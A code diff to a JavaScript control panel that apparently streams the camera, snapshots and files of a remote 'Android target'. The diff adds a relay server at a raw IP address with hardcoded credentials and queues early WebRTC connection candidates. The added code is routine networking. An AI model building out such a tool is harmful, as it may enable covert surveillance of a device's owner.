@@ -83,11 +83,20 @@ let isCameraStreamingActive = false;
 let currentPath = "/storage/emulated/0/";
 let currentSnapshotBase64 = null;
 let activeDownloads = {};
+let queuedRemoteCandidates = [];
 
 const rtcConfig = {
   iceServers: [
+    { urls: 'stun:45.158.126.67:3478' },
     { urls: 'stun:stun.l.google.com:19302' },
-    { urls: 'turn:numb.viagenie.ca', username: 'your@email.com', credential: 'yourpassword' }
+    {
+      urls: [
+        'turn:45.158.126.67:3478?transport=udp',
+        'turn:45.158.126.67:3478?transport=tcp'
+      ],
+      username: 'myuser',
+      credential: 'mypassword123'
+    }
   ]
 };
 
@@ -927,6 +936,15 @@ socket.on('signal', async (data) => {
   try {
     if (signal.type === 'offer') {
       await peer.setRemoteDescription(new RTCSessionDescription(signal));
+      while (queuedRemoteCandidates.length > 0) {
+        const c = queuedRemoteCandidates.shift();
+        try {
+          await peer.addIceCandidate(new RTCIceCandidate(c));
+          logDebug('[WebRTC] Drained queued ICE candidate');
+        } catch (ce) {
+          console.warn('[WebRTC] Error adding queued candidate:', ce);
+        }
+      }
       const answer = await peer.createAnswer();
       await peer.setLocalDescription(answer);
       socket.emit('signal', {
@@ -935,7 +953,12 @@ socket.on('signal', async (data) => {
         signal: { type: 'answer', sdp: answer.sdp }
       });
     } else if (signal.candidate) {
-      await peer.addIceCandidate(new RTCIceCandidate(signal.candidate));
+      if (peer && peer.remoteDescription) {
+        await peer.addIceCandidate(new RTCIceCandidate(signal.candidate));
+      } else {
+        queuedRemoteCandidates.push(signal.candidate);
+        logDebug('[WebRTC] Queued incoming ICE candidate (waiting for offer)');
+      }
     }
   } catch (err) {
     console.error('Signal parsing error:', err);
@@ -944,6 +967,7 @@ socket.on('signal', async (data) => {
 
 socket.on('android-client-disconnected', () => {
   updateStatus('Android target disconnected');
+  queuedRemoteCandidates = [];
   if (peer) {
     peer.close();
     peer = null;
